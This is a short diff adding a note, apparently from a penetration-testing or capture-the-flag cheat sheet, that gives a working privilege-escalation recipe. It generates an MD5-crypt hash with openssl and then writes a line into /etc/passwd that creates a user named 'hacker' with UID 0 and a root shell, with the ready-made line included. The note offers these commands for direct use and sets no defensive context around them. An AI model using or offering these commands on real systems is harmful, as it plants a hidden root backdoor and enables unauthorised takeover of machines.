@@ -1,0 +1,8 @@
+#generate password
+openssl passwd -1 -salt ignite pass123
+
+#write the following into /etc/passwd
+[Username]:[PASSWORD]:0:0:root:/root:/bin/bash
+
+#in our case
+hacker:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash
